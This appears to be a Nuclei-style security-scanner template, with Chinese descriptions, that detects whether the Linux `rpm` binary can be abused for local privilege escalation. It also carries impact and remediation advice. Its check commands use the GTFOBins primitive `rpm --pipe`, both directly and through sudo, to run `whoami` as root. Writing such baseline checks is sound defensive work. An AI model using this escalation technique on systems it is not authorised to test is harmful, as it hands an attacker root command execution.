id: privesc-rpm

info:
  name: rpm 可被滥用进行本地提权（本地基线扫描）
  author: daffainfo
  severity: high
  description: |
    `rpm` 具备执行子命令、启动 shell、解释脚本或继承高权限上下文的能力时，若被 sudo 免密授权、错误设置 SUID/能力位或出现在高权限自动化流程中，普通用户可能借此获得 root 命令执行。GTFOBins 记录了这类二进制的提权用法；模板先确认当前用户不是 root，再通过 `rpm --pipe 'whoami 0<&1'`、`sudo rpm --pipe 'whoami 0<&1'` 等方式执行 `whoami`，当高权限路径返回 `root` 时判定存在可利用的本地提权路径。
  impact: |
    - 低权限用户可能直接获得 root 命令执行能力，读取或修改受保护文件、植入持久化项并关闭安全控制。
    - 若该二进制出现在 sudoers、SUID/SGID 文件或自动化任务中，攻击者可绕过预期的最小权限边界并扩大入侵影响。
  remediation: |
    - 从 sudoers 和自动化任务中移除 `rpm` 的免密或通配授权，必须保留时使用绝对路径、固定参数和最小权限账户。
    - 清理 `rpm` 上非必要的 SUID/SGID/capability 权限，定期使用 `sudo -l`、`find -perm` 和文件完整性检查复核高风险二进制。
  reference:
    - https://gtfobins.github.io/gtfobins/rpm/
  metadata:
    verified: true
    max-request: 3
  tags: code,linux,rpm,privesc,local

self-contained: true
code:
  - engine:
      - sh
      - bash
    source: |
      whoami

  - engine:
      - sh
      - bash
    source: |
      rpm --pipe 'whoami 0<&1'

  - engine:
      - sh
      - bash
    source: |
      sudo rpm --pipe 'whoami 0<&1'

    matchers-condition: and
    matchers:
      - type: word
        part: code_1_response
        words:
          - "root"
        negative: true

      - type: dsl
        dsl:
          - 'contains(code_2_response, "root")'
          - 'contains(code_3_response, "root")'
        condition: or
